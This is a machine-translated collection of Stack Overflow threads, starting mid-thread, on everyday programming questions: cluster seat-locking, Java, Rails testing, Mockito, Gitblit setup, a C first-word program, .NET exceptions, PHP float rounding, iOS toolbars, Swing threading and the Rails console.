这听起来可能很愚蠢，但我需要清除我的疑问。作为我项目的一部分，我正在制作这个巴士票预订系统，就像 RedBus 一样。我只是想知道它在集群环境中如何工作。就像我只有 1 张票并且我同时收到 2 个请求一样，我将如何在集群中处理它，因为我将拥有多个服务器。我还应该在每台服务器或所有服务器共有的地方维护关键部分。我尝试使用谷歌搜索，但我对得到的答案不满意。我想锁定关键部分，但在集群中怎么可能呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-09-28T09:44:33.353

单独的关键部分部分可以移动到公共系统中，所有集群都会向该系统发送请求以分配座位。

这是唯一的答案，我能想到。

# java - 将数据存储在变量中与内联算术

> ID：13061234
> 
> 赞同：5
> 
> 时间：2012-10-25T03:44:03.017
> 
> 标签：java, performance, memory-management

这两个代码片段在内存使用和性能/开销方面有什么区别吗？

```
final float xPos = (CAMERA_WIDTH / 2) - (mSprite.getWidth() / 2);
final float yPos = (CAMERA_HEIGHT / 2) - (mSprite.getHeight() / 2);
mSprite.setPosition(xPos, yPos); 
```

另一种情况：

```
mSprite.setPosition(((CAMERA_WIDTH / 2) - (mSprite.getWidth() / 2)), ((CAMERA_HEIGHT / 2) - (mSprite.getHeight() / 2))); 
```

我能看到的唯一区别是第一个片段将变量存储在我认为与第二个片段不同的内存区域中，但我对 Java 内存分配不太熟悉（我更喜欢 C /C++ 人）。

我的问题是：一种方式或另一种方式有什么好处吗？在第一个示例中使用`final`关键字是否会影响它？

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T03:47:18.413

> 在第一个示例中使用 final 关键字会影响它吗？

在内存方面没有。但是`final`保证在你处理对象的情况下，整个执行引用不能指向其他对象（如果是原始类型，`final`保证该变量的值不会在整个执行过程中改变）

> 这两个代码片段在内存使用和性能/开销方面是否有任何区别

根据我猜测的经验，第一种方法当然会有开销，因为需要创建和维护变量（两种情况的内存使用几乎相同）。尽管存在一些开销，但使用当前的计算基础设施，它可以忽略不计。

但与第二种方法相比，第一种方法更具可读性和可维护性。让我们把微优化留给 JVM

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T03:59:21.900

> 这两个代码片段在内存使用和性能/开销方面是否有任何区别

我将尝试回答第二个问题。但有待纠正。

在第一种情况下，在堆栈上创建了两个变量，而正在执行的函数正在运行。

对象 mSprite 的内存是在堆内存中创建的。并且在选项（1）和（2）中为这个对象分配多少内存没有区别

所以 (1) 和 (2) 之间的唯一区别是 (1) 在堆栈上创建了更多内存。一旦退出执行此函数的方法，就会检索到它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T05:36:07.753

我希望这些是完全相同的。在这两种情况下，无论如何都需要堆栈来存储中间结果。坦率地说，JIT 可能会内联变量并使这两个变量*完全*等价。

# ruby-on-rails - 测试这个帖子和评论模型之间的关联？

> ID：13061235
> 
> 赞同：0
> 
> 时间：2012-10-25T03:44:10.360
> 
> 标签：ruby-on-rails, rspec

在[上](https://stackoverflow.com/questions/13042984/testing-the-draft-attribute-of-this-post-model-rspec-capybara)一个问题中，我询问了如何为 a`Post`和 User构建测试`model`。我现在想测试第三个模型，称为`Comment`.

**架构.rb：**

```
 create_table "posts", :force => true do |t|
    t.string   "title"
    t.string   "content"
    t.integer  "user_id"
    t.datetime "created_at",                               :null => false
    t.datetime "updated_at",                               :null => false
    t.integer  "comments_count",        :default => 0,     :null => false
    t.datetime "published_at"
    t.boolean  "draft",                 :default => false
  end

  create_table "comments", :force => true do |t|
    t.text     "content"
    t.integer  "post_id"
    t.integer  "user_id"
    t.datetime "created_at", :null => false
    t.datetime "updated_at", :null => false
  end 
```

我特别想测试`comments_count`：一个想在帖子中创建评论。他们的关联已经建立（发表`has_many`评论）。并检查是否`comments_count`增加。

谁能给我一个测试的样子的例子吗？

当前代码：

**评论.rb：**

```
class Comment < ActiveRecord::Base
  attr_accessible :content, :user_id

  belongs_to :post, :counter_cache => true
  belongs_to :user
end 
```

**规格/工厂：**

```
FactoryGirl.define do
  factory :user do
    username     "Michael Hartl"
    email    "michael@example.com"
    password "foobar"
    password_confirmation "foobar"
  end
end

FactoryGirl.define do
  factory :post do
    title     "Sample Title"
    content    "Sample Content"
    published_at Time.now()
    comments_count 0
    draft false
    association :user
  end
end 
```

**规格/模型/post_spec.rb：**

```
require 'spec_helper'

describe Post do
  let(:post) { FactoryGirl.create(:post) }

  subject { post }

  it { should respond_to(:title) }
  it { should respond_to(:content) }
  it { should respond_to(:user_id) }
  it { should respond_to(:user) }
  it { should respond_to(:published_at) }
  it { should respond_to(:draft) }
  it { should respond_to(:comments_count) }

  its(:draft) { should == false }

  it { should be_valid }
end 
```

（顺便说一句，这是我第一次在我的应用程序中测试一些东西。我在测试一些不需要测试的东西吗？是否缺少一些应该的东西？）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T07:53:48.667

我们可能需要一个工厂来评论：

```
FactoryGirl.define do
  factory :comment do
    content "Sample comemnt"
    association :user
    association :post
  end
end 
```

以下测试（我将其放入请求测试中）将检查以确保在用户向表单添加内容并单击右键时实际添加了评论：

```
describe "New comments" do
  let(:post) FactoryGirl.create(:post)
  let(:user) FactoryGirl.create(:user)

  context "valid with content comment added to database" do

    before do
      visit post_path(post)
      fill_in 'Content', with: "A new comment."
    end

    expect { click_button 'Create Comment' }.to change(Comment, :count).by(1)
  end
end 
```

这个测试可能对评论模型规范有好处：

```
describe Comment do
  let(:comment) { FactoryGirl.create(:comment) }

  subject { comment }

  it { should respond_to(:content) }
  it { should respond_to(:user_id) }
  it { should respond_to(:user) }
  it { should respond_to(:post_id) }

  it { should be_valid }

  it "should belong to a post which has a comment count of 1" do
    comment.post.comment_count.should equal 1
  end
end 
```

然后让这个测试通过的方法是在评论模型中放一些东西，这样当一个新的评论被创建时，它会更新它所属的帖子中的 comment_count 属性。

我不能 100% 确定那里的最后一个测试是否正确编写。我不确定您是否可以覆盖先前定义的主题。

# java - 我可以将 body 属性（而不是子属性）拉到我的 sitemesh/freemarker 装饰器中吗？

> ID：13061236
> 
> 赞同：0
> 
> 时间：2012-10-25T03:44:27.137
> 
> 标签：java, freemarker, sitemesh

我们正在使用具有以下示例内容的页面：

```
<html>
    <head>
        <title>Page Title</title>
        <!-- (page-specific JS and styles) -->
    </head>
    <body>
        <h1>Page Title</h1>
        <!-- (rest of page content) -->
    </body>
</html> 
```

然后使用 SiteMesh + Freemarker 我们将它们装饰成这样：

```
<!doctype html>
<html>
    <head>
        <title><#if title?? && title?has_content>${title}</#if></title>
        <!-- (global styles and scripts)-->
        ${head}
    </head>
    <body>
        <!-- (Header elements) -->
        ${body}
        <!-- (Footer elements) -->
    </body>
</html> 
```

我想知道是否有一种很好的方法可以将页面级`<body>`元素上的任何额外属性传播到装饰器的`<body>`元素，所以它们不会被简单地丢弃？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T06:13:08.177

好的，经过一些实验，我最终自己找到了答案：D 身体属性进入`page.properties["body.attrName"]`，您可以在我的情况下使用，如下所示：

```
<#if page.properties["body.class"]??>
    <body class="${page.properties["body.class"]}">
<#else>
    <body>
</#if> 
```

# java - 如何处理 Mockito 中不匹配的参数？

> ID：13061241
> 
> 赞同：25
> 
> 时间：2012-10-25T03:44:43.283
> 
> 标签：java, junit, mockito

我喜欢做以下事情：

```
.when( 
    myMock.doSomething(
        Matchers.eq( "1" )
    ) 
)
.thenReturn( "1" )
.othwerwise()
.thenThrow( new IllegalArgumentException() ); 
```

当然`otherwise()`方法不存在，只是为了向您展示我想要完成的事情。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-10-25T05:02:32.990

（轻微的免责声明，我从来没有亲自做过，只是在javadoc中阅读过它）......如果你的模拟界面上的所有方法都可以使用相同的默认行为，你可以[在你的模拟上设置默认答案](http://docs.mockito.googlecode.com/hg/latest/org/mockito/Mockito.html#14)以如下方式：

```
Foo myMock = Mockito.mock(Foo.class,new ThrowsExceptionClass(IllegalArgumentException.class));
Mockito.when(myMock.doSomething(Matchers.eq("1"))).thenReturn("1"); 
```

JavaDoc 链接：[Mockito#mock](http://docs.mockito.googlecode.com/hg/latest/org/mockito/Mockito.html#mock%28java.lang.Class,%20org.mockito.stubbing.Answer%29)和[ThrowsExceptionClass](http://docs.mockito.googlecode.com/hg/latest/org/mockito/internal/stubbing/answers/ThrowsExceptionClass.html)

或者，正如[Stubbing 教程](http://docs.mockito.googlecode.com/hg/latest/org/mockito/Mockito.html#2)中所讨论的，存根的顺序很重要，最后匹配获胜，所以你也可以这样做：

```
Foo myMock = Mockito.mock(Foo.class);
Mockito.when(myMock.doSomething(Matchers.any(String.class))).thenThrow(IllegalArgumentException.class);
Mockito.when(myMock.doSomething(Matchers.eq("1"))).thenReturn("1"); 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-10-25T04:24:42.067

您可以创建自己的 Answer 实现，它会注意调用的参数：

```
myMock.doSomething(Mockito.any(String.class)).thenAnswer( myAnswer ); 
```

上述答案的实现可以这样做：

```
public String answer(InvocationOnMock invocation) {
    if ("1".equals(invocation.getArguments()[0])) {
       return "1";
    }
    else {
       throw new IllegalArgumentException();
    }
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-10-25T03:57:14.697

只需使用相反的条件，即考虑您的示例本身。您可能需要`not(eq())`在需要时使用`otherwise`：

```
 .when( myMock.doSomething(Matchers.eq( "1" )))
     .thenReturn( "1" )
 .when( myMock.doSomething(not(Matchers.eq( "1" ))))
     .thenThrow( new IllegalArgumentException() ); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-03-01T16:26:25.643

使用 java 8 lambda，您可以执行以下操作：

```
myMock.doSomething(Mockito.any(String.class)).thenAnswer(invocation -> {    
    Object arg = invocation.getArguments()[0];
    if ("1".equals(arg)) {
        return "1";
    }

    throw new IllegalArgumentException("Expected 1 but got " + arg);
}); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-01-18T13:57:08.560

@Charlie 接受的答案所描述的方式不再起作用。当您尝试覆盖某些参数的一般抛出异常行为时，会触发第一个规则并且您有一个异常（正如您所要求的那样）。

```
Mockito.when(myMock.doSomething(any()))
    .thenThrow(IllegalArgumentException.class);
Mockito.when(myMock.doSomething(eq("1"))).thenReturn("1"); //An exception is thrown here
// because of the call to .doSomething() on the mock object 
```

为避免该调用，可以使用`Mockito.doReturn()`以下方法：

```
Mockito.when(myMock.doSomething(any()))
    .thenThrow(IllegalArgumentException.class);
Mockito.doReturn("1").when(myMock).doSomething(eq("1")); 
```

`doReturn()`最初的问题是根据它的 javadoc 存在的原因之一：

```
Here are those rare occasions when doReturn() comes handy:
<...some lines are skipped...>
Overriding a previous exception-stubbing:

hen(mock.foo()).thenThrow(new RuntimeException());
//Impossible: the exception-stubbed foo() method is called so RuntimeException is thrown.
when(mock.foo()).thenReturn("bar");

//You have to use doReturn() for stubbing:
doReturn("bar").when(mock).foo(); 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2013-12-05T22:47:36.540

或者，您可以使用验证，如下所示：

```
when(myMock.doSomething("1")).thenReturn( "1" );
assertEquals(myMock.doSomething("1"),"1");
verify(myMock).doSomething("1") 
```

# git - 如何在 Windows 中设置 gitblit

> ID：13061242
> 
> 赞同：4
> 
> 时间：2012-10-25T03:44:55.240
> 
> 标签：git, gitblit

我们在本地服务器中需要 GIT 服务器。在网上搜索后，我们决定使用`Gitblit`易于安装的。

但是当我们想`Gitblit`从其他机器访问时我们遇到了问题。正如“**创建您自己的自签名证书**”中提到的设置文档一样，我们应该**将您的主机名设置为 HOSTNAME 变量。**这是我的 makekeystore.cmd 文件。

```
@SET HOSTNAME=my-server-ip<br/>
@del keystore<br/>
@java -cp gitblit.jar;"%CD%\ext\*" com.gitblit.MakeCertificate --hostname %HOSTNAME% --subject "CN=%HOSTNAME%, OU=Gitblit, O=Gitblit, L=Some Town, ST=Some State, C=US" 
```

我们已经更新了 gitblit.properties 如下

```
server.httpBindInterface = my server ip
server.httpsBindInterface = my server ip
server.httpPort = 9090
server.httpsPort = 9443 
```

经过这样的设置，我们仍然无法访问 Gitblit。当我们输入 http:`my-server-ip:9090`时页面无法打开。

如果我们将所有这些值改回 localhost 并输入 http://localhost:9090，它就可以工作。

那么有没有人知道如何设置Gitblit，我已经阅读了很多次官方文档，但没有结果。谁能给我一个简单的？

非常感谢！:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-07-24T13:08:34.680

```
server.httpBindInterface = my server ip
server.httpsBindInterface = my server ip 
```

这些值允许您将 Gitblit 配置为通过其本地 IP 地址绑定到特定的网络适配器。您没有在此处指定外部/外部 IP 地址。如果您不关心绑定到特定的网络适配器，您可以将这些设置留空，Gitblit 将在服务器上所有可用的本地网络适配器上提供 9090 和 9443。

# c - 编写一个小 C 程序，打印文件每一行的第一个单词

> ID：13061244
> 
> 赞同：0
> 
> 时间：2012-10-25T03:45:30.233
> 
> 标签：c

这是我目前所拥有的

```
#include<stdio.h>
#include<stdlib.h>

void main(int argc, char *argv[]){

  FILE *fp;
  char word[30];
  int k;
  for (k=1 ; k < argc ; k++)
    {
      fp = fopen(argv[k],"r");
      if (fp == NULL)
        fprintf(stdout,"Error with file: %s\n",argv[k]);
      else{
        while( !feof(fp) ){
           fscanf(fp,%s%*[^\n]",word);
           printf("word: %s\n",word);
           memset(word,0,sizeof(word));                       
        }
      }
    fclose(fp);
    }
} 
```

我不确定我所拥有的是否正确，我也不确定应该在 while 循环中放置什么以打印出文件中每一行的每个第一个单词。非常感谢您的帮助，提前感谢您的任何帮助/提示！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T03:59:33.223

首先，您可以替换：

```
int k = 1;
for (k; k < argc; k++) 
```

更“标准”：

```
int k;
for (k = 1; k < argc; k++) 
```

然后，在该`else`部分内部，一个简单的循环和状态机将只输出第一个单词中的字符。基于字符的状态机的优点是不管行多长，并且没有缓冲区溢出的机会。

使用 30 个字符的缓冲区，如果您尝试一次处理（例如）60 个字符的文件，您可能会遇到问题。

以下伪代码可能会有所帮助：

```
state = before_word
get character from input stream (see fgetc)
while character is not end-of-file:
    if character is newline:
        echo character (see putchar)
        state = before_word
    else
        if state is before_word:
            if character is not white space (see isblank/isspace):
                echo character
                state = in_word
            endif
        else
            if state is in_word:
                if character is white space:
                    state = past_word
                else
                    echo character
                endif
            endif
        endif
    endif
    get character from input stream (see fgetc)
endwhile 
```

它通过维护一个状态来工作（你的状态取决于通过输入流进入的东西）。

初始状态是`before_word`因为它紧接在文件第一行之前的假想换行符之后。在该状态下，所有空白字符都被丢弃，第一个非空白字符`in_word`在回显该字符后导致状态更改为 。

当状态为`in_word`时，输出每个字符。到达该状态的第一个空白字符不输出，并导致状态转移到`past_word`。

在`past_word`状态下，所有字符都被丢弃。

在任何状态下（此`if`语句是第一个），换行符都会强制状态变为`before_word`.

将伪代码转换为 C 代码对您来说是一个很好的练习，特别是如果这是家庭作业。

* * *

如果它*不是*家庭作业，下面是一个解决方案。由于 SO 是一个公共网站，因此请小心不要将其作为自己的工作，而且我相信教育工作者会检查此类网站是否存在抄袭行为。一个简单的谷歌搜索`echoAndChange`几乎肯定会给你一个失败的分数。

所以，假设这不是家庭作业，或者你只是想要一些东西来检查你自己的解决方案，我们开始吧：

```
#include <stdio.h>
#include <ctype.h>

// States and utility function for echo and change state.

typedef enum {ST_PRE, ST_IN, ST_POST} tState;

tState echoAndChange (int chr, tState newState) {
    if (chr != EOF) putchar (chr);
    return newState;
}

int main (int argc, char *argv[]) {
    FILE *fp;
    int k, chr;
    tState state;

    // Process each file.

    for (k = 1; k < argc; k++) {
        fp = fopen (argv[1], "r");
        if (fp == NULL) {
            printf ("Error with file: %s\n", argv[1]);
        } else {
            // Initial state pre-word, then process every character.

            state = ST_PRE;
            while (1) {
                chr = fgetc (fp); if (chr == EOF) break;

                // Newline: output it and change to pre-word.

                if (chr == '\n') {
                    state = echoAndChange (chr, ST_PRE);
                    continue;
                }

                // Pre-word and nonspace: echo and change to in-word.

                if (state == ST_PRE) {
                    if (!isblank (chr))
                        state = echoAndChange (chr, ST_IN);
                    continue;
                }

                // In-word: change to post word if space, otherwise echo.

                if (state == ST_IN)
                    if (isblank (chr))
                        state = echoAndChange (EOF, ST_POST);
                    else
                        state = echoAndChange (chr, ST_IN);
            }
            fclose (fp);
        }
    }
    return 0;
} 
```

在著名的“Lorem ipsum”文本上运行该程序时：

```
Lorem ipsum dolor sit amet, consectetur adipisicing elit,
sed do eiusmod tempor incididunt ut labore et dolore magna
aliqua. Ut enim ad minim veniam, quis nostrud exercitation
ullamco laboris nisi ut aliquip ex ea commodo consequat.
Duis aute irure dolor in reprehenderit in voluptate velit
esse cillum dolore eu fugiat nulla pariatur. Excepteur sint
occaecat cupidatat non proident, sunt in culpa qui officia
deserunt mollit anim id est laborum. 
```

你可以看到它的实际效果：

```
Lorem
sed
aliqua.
ullamco
Duis
esse
occaecat
deserunt 
```

如果您想要一个*更短*的程序，您可以将一些状态机吸收到您的语句执行*顺序*中（而不用担心前导空格），例如：

```
#include <stdio.h>
#include <ctype.h>

int main (int argc, char *argv[]) {
    FILE *fp;
    int echo, chr;

    if (argc < 2) {
        puts ("Usage: firstword <input-file>");
        return -1;
    }

    fp = fopen (argv[1], "r");
    if (fp == NULL) {
        printf ("Error with file: %s\n", argv[1]);
        return -1;
    }

    echo = 1;
    chr = fgetc (fp);
    while (chr != EOF) {
        if (chr == '\n') echo = 1;
        if (isblank (chr)) echo = 0;
        if (echo ) putchar (chr);
        chr = fgetc (fp);
    }
    fclose (fp);
    return 0;
} 
```

这里的基本规则是：

*   初始状态是回声。
*   然后，对于每个字符：
    *   换行强制回显（换行回显两行向下）。
    *   任何空白都会关闭回声。
    *   如果回显打开，则回显字符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:03:19.450

有几种方法可以做到这一点。一种方法是使用`getline()`逐行读取文件，然后打印字符直到第一个空白字符：

```
#include <ctype.h>

char *line = NULL;
size_t siz = 0;
int i = 0;

while(-1 != getline(&line, &siz, fp)){
    for(i = 0; i < siz && !isspace(line[i]); i++){
        printf("%c", line[i]);
    }
} 
```

这仍然需要处理一些边缘情况（空白行等），但它应该让你开始。

# .net - 在构建类库时，如果我的类方法遇到致命错误，返回调用过程的最佳做法是什么？

> ID：13061248
> 
> 赞同：0
> 
> 时间：2012-10-25T03:46:15.077
> 
> 标签：.net, class, exception

因此，假设我使用可能导致致命异常（例如网络故障）的方法构建了一个类。最佳做法是：

1) 抛出一个异常，让调用程序捕获并处理它？2) 引发调用过程为其添加处理程序的类事件？3) 抑制异常并从方法中返回 False 或 Nothing 而不是预期的结果？

如果这是一个令人恼火的微不足道的问题，我深表歉意。我是 .NET 新手

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T03:52:10.090

我宁愿选择选项 1。

在异常中提供尽可能多的信息，让调用者处理异常。除此之外，您还应该尝试重新抛出异常（或首先不捕获它），以便调用者可能收到原始消息和堆栈跟踪。

你几乎不应该在调用者不知道的情况下吞下异常。

来自[异常和异常处理（C# 编程指南）](http://msdn.microsoft.com/en-us/library/ms173160.aspx)

> 不要捕获异常，除非您可以处理它并使应用程序处于已知状态。如果您捕获 System.Exception，请使用 catch 块末尾的 throw 关键字重新抛出它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T03:59:28.687

从某种意义上说，所有这些都是流行的方法，尽管什么都不返回，也称为静默失败，是相当危险的。

我会通过实际编写客户端代码来考虑我希望如何使用该库。这将很好地表明异常或处理程序是否更好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T01:49:16.003

当我构建 WCF 服务以在代码中出现异常时返回客户端错误时，我想到了这一点。

我研究了我的代码并将可能发生的错误定义为错误代码和错误消息，当客户端发生异常或错误时，我的方法将返回一个 Int errorCode。

客户端将在我的服务中使用另一种方法来了解错误是什么。

示例代码：

```
public string GetError(int error)
        {
            switch (error)
            {
                case 1:
                    _errorString = Constants.ERR_INVALID_INFORMATION;
                    break;
                case 2:
                    _errorString = Constants.ERR_DELETE_FAILED;
                    break;
                case 3:
                    _errorString = Constants.ERR_ADD_FAILED;
                    break;
                case 4:
                    _errorString = Constants.ERR_UPDATE_FAILED;
                    break;       
            }
            return _errorString;
        } 
```

# php - PHP圆形疯狂错误

> ID：13061249
> 
> 赞同：0
> 
> 时间：2012-10-25T03:46:45.053
> 
> 标签：php, floating-point

```
<?php
    $last_percent = 0;
    $as = array("110.800002098083",  "30", "36.1499996185303", "11", "13", "13.9899997711182", "74.5200042724609", "13.9899997711182");
    $t = 304.46000552177;
    foreach($as as $a) {
        $last_percent += round($a*100/$t, 2);
    }
    var_dump( $last_percent);
    $last_percent = 100 - $last_percent;
    var_dump( $last_percent);
?> 
```

为什么结果是 0.33000000000001？为什么它只发生在 100 和 99 上？如果我使用 $last_percent = 90 - $last_percent; 结果是-9.67

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T03:52:42.513

简短的回答是浮点值并不完美。有时，根据您的系统设置，会出现错误。

更长的答案是浮点值不是数值的精确表示，它们是近似值——在大多数情况下——已经足够好了。问题是有时你想要的值会落入浮点不能完美工作的区域，并且你会得到这样的舍入错误。

这就是依赖精确值的系统（如金融应用程序）不使用浮点数的原因。他们使用特殊用途的高精度类型，或者用两个单独的整数值表示美元和美分。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T03:51:10.420

当您需要 100% 精度时，浮点计算并不可靠。PHP 文档在这里有官方警告[http://php.net/manual/en/language.types.float.php](http://php.net/manual/en/language.types.float.php)如果您需要高精度的计算，您应该使用任意精度的数学函数或 gmp 函数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T04:04:46.800

为什么浮点数不准确：

他们将小数视为二进制分数的组合。1/2 + 1/4 + 1/8 + 1/16 + ...

并非所有数字都可以用这个完美地表示，所以它只是给你它的“最佳尝试”。

# objective-c - 如何在 iOS 中向 TableView 添加工具栏

> ID：13061251
> 
> 赞同：10
> 
> 时间：2012-10-25T03:47:12.283
> 
> 标签：objective-c, ios, toolbar

我正在构建一个简单的笔记应用程序，我想在 TableView 的底部添加一个静态栏。例如，我想添加一个帮助按钮。我怎样才能对我的 TableView 执行此操作？

至今：

我已经通过情节提要添加了一个工具栏，但这使它粘在最后一个 tableView 单元格的末尾。我希望它粘在底部。我输入此代码以编程方式执行：

```
@property (strong, nonatomic) IBOutlet UIToolbar *toolbar; 
```

在我的 tableViewController.h 文件和

```
[self.view addSubview:_toolbar];
[self.navigationController.view setFrame:self.view.frame]; 
```

在我的`viewDidLoad`方法中的 tableViewController.m 文件中

谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-25T04:14:00.067

最好的解决方案是使用 UIViewController 而不是 UITableViewController。（上面已经说过了，但让我给你细节）。

使用其各自的 XIB 创建一个新的 UIViewController。在你的新 UIViewController 的视图中拖动一个 UITableView，调整它的大小，然后将你的 UIToolbar 拖动到任何你想要的地方。

你应该有这样的东西：

![在此处输入图像描述](../Images/1789cec7a07992868d8bc3987a6835d5.png)

黑色边框代表 UIViewController 的主视图。红色边框代表表格视图。蓝色边框代表您的工具栏。

之后，让你的 UIViewController 遵守两个协议：UITableViewDelegate 和 UITableViewDataSource。您将必须手动实现它的基本方法，例如 cellForRowAtIndexPath、numberOfRowsInSection 等，但这不会花费您很长时间。

将你的 UITableView 链接到你的 UIViewController。也将它的“数据源”和“委托”属性链接到视图控制器。

您将在 15 分钟内完成设置。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-11-15T17:22:03.587

我刚刚发现了一个更好的技巧！

1.  确保没有导航栏（来自您的失败尝试）
2.  拖放一个“Bar Button Item”（Xcode 会神奇地将它放置在底部）
3.  **注意**：如果您现在运行应用程序，您将看不到任何东西！（所以请继续阅读）
4.  在 viewDidLoad 下添加以下代码行：

    self.navigationController.toolbarHidden = NO;

完毕！

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-03T21:25:34.700

您可以将标准 UITableViewController 与情节提要一起使用。在“模拟指标”中，转到底部栏菜单并选择“工具栏”。工具栏出现。然后，您可以向其中添加按钮项。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-25T04:02:33.100

通过代码添加工具栏很简单。

```
UIToolbar *toobar = [[UIToolbar alloc]initWithFrame:frameYouNeed];
toobar.barStyle = UIBarStyleBlack;
[self.view addSubview:toobar]; 
```

但是如果你使用 UITableView 作为 subView，而不是 UITableViewController 会更好

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-25T04:01:04.057

你应该使用`ViewController`而不是`TableViewController`

然后`TableView`在你的头文件中将你的作为 IBOutlet 。声明委托和数据源。你准备好了。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-03-21T19:38:20.180

您可以使用默认包含在所有 UITableViews 中的工具栏，并将 UIBarButtonItems 添加到它。尽管名称如此，但 UIBarButtonItems 可以自定义为任何类型的视图。然后将它们添加到属性 self.toolbarItems，UITableViews 默认可以使用该属性。例如

```
UIBarButtonItem * textItem;
UILabel * label = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, 250, 48)];
label.text =  @"ImportantText";
label.adjustsFontSizeToFitWidth = YES;
label.textAlignment = NSTextAlignmentRight;
textItem = [[ UIBarButtonItem alloc ] initWithCustomView:label];

UIBarButtonItem * switchItem;
UISwitch * switchCtrl = [[UISwitch alloc] init];
[switchCtrl addTarget:self action:@selector(toggleSomething:) forControlEvents:UIControlEventValueChanged];
switchItem = [[ UIBarButtonItem alloc ] initWithCustomView:switchCtrl];

self.toolbarItems = [ NSArray arrayWithObjects:
                     [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemFlexibleSpace target:nil action:nil],
                     textItem,switchItem,nil ]; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-09-02T08:13:01.723

通过检查导航控制器中的显示工具栏，我在情节提要中得到了这个工作。然后将 Bar Button Items 拖到现在显示在 Table View Controller 底部的灰色工具栏区域。然后将 Bar Button Items 连接到方法 Navigation Controller。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2012-10-25T03:58:09.000

试试这个，它会将您的工具栏添加为表格的 footerView。并确保您将表格的页脚高度设置为 44（工具栏的高度）。

```
self.tableView.tableFooterView = _toolbar; 
```

# java - 按下 JRadiobutton 冻结 GUI

> ID：13061260
> 
> 赞同：3
> 
> 时间：2012-10-25T03:48:09.263
> 
> 标签：java, swing, jtextarea, jradiobutton

我是 Swing 的新手，所以这似乎是一个非常幼稚的问题。

我有一个显示初始语句和两个单选按钮的 JFrame。RadioButton1 是接受，RadioButton2 是拒绝。如果用户选择接受，则程序继续。所以我为 Accept 创建了一个 ActionListener，这样我的其余代码就在这个 ActionListener 中。然而，一旦用户按下接受，GUI 就会冻结。按拒绝只是存在于程序之外。

```
 public void game() throws Exception
    {
        jTextArea1.setLineWrap(true);
        jTextArea1.setWrapStyleWord(true);
        jTextArea1.setText("Please choose Accept or Reject");

        jRadioButton1.setVisible(true);
        jRadioButton2.setVisible(true);

            jRadioButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {

              jRadioButton1.setVisible(false);
              jRadioButton2.setVisible(false);
              repaint();
             //more code
           });
    } 
```

在此之后，我与服务器建立连接，它工作正常，因为当我使用 System.out.println() 时，所有输出都很好，只是 GUI 被冻结。

当用户按下接受时，是否有更好的方法继续？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T03:53:13.307

您可以查看使用 SwingWorker 类。

基本上，Java Swing 应用程序是单线程的，如果您执行任何进程密集型任务，控制权就会转移到该代码段，UI 会挂起，等待控制权交还。

编辑：您还可以查看 SwingUtilities 类。

编辑：使用 SwingWorker 类的基本信息：

您可以创建一个扩展 SwingWorker 的新类并实现该 `public String doInBackground() { /*Do Stuff here*/ }`方法。并在您的 ActionListener 事件中，创建 SwingWorker 的实例并调用该`swingWorkerObject.execute()`方法以启动 doInBackground 方法的执行。

更多细节在这里：[http ://docs.oracle.com/javase/6/docs/api/javax/swing/SwingWorker.html](http://docs.oracle.com/javase/6/docs/api/javax/swing/SwingWorker.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T03:53:01.290

仅在事件处理中放置最少需要的 GUI 更新，其余的**非 GUI**使用`Thread`s.
顺便说一句， no`repaint`​​之后是必需的`setVisible`。

# ruby-on-rails - Rails 控制台：助手和应用程序在哪里定义？

> ID：13061264
> 
> 赞同：3
> 
> 时间：2012-10-25T03:48:39.090
> 
> 标签：ruby-on-rails, console

在`rails console`中，有两个对象可用：`app`和`helper`。 [几篇](http://errtheblog.com/posts/24-irb-mix-tape) [博客](http://rors.org/2009/12/20/10-rails-console-tricks) [文章](http://37signals.com/svn/posts/3176-three-quick-rails-console-tips)涵盖了这些内容的用途。不幸的是，它们在普通 Rails 应用程序的源代码中不可用。

这些方法在哪里定义，或者我如何在 Rails 应用程序中使用它们？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T03:48:39.090

# TLDR

```
.../gems/railties-3.2.8/lib/rails/console/app.rb
.../gems/railties-3.2.8/lib/rails/console/helpers.rb 
```

# 长版

我将介绍我是如何发现这些信息的以及声明是什么样的。

如何：

```
# in rails console
1.9.3p194 :019 > a = self
 => main
1.9.3p194 :020 > a.method :helper
 => #<Method: Object(Rails::ConsoleMethods)#helper>
1.9.3p194 :021 > _.source_location
 => ["/Users/erichu/.rvm/gems/ruby-1.9.3-p194@global/gems/railties-3.2.8/lib/rails/console/helpers.rb", 3] 
```

该文件的相关来源：

```
def helper
  @helper ||= ApplicationController.helpers
end 
```

